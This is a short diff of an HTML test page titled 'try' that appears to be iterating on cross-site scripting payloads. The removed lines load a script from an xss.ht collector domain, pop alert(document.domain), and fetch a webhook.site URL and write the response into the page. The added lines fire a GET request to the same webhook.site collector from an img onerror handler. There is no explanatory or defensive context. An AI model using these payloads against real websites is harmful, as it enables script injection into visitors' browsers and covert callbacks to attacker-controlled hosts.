@@ -4,9 +4,14 @@
 <title>try</title>
 </head>
 <body>
-	<script src=https://ap607.xss.ht></script>
-	<img src=x onerror=alert(document.domain)>
-	<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’https://webhook.site/2d3624ec-bb10-4406-ae7b-b32e58861aea’);x.send();</script>
+	<img src=x onerror="loadXMLDoc()">
+<script>
+	function loadXMLDoc() {
+  	var xhttp = new XMLHttpRequest();
+  	xhttp.open("GET", "https://webhook.site/2d3624ec-bb10-4406-ae7b-b32e58861aea", true);
+  	xhttp.send();
+	}
+</script>
 	
 </body>
 </html>
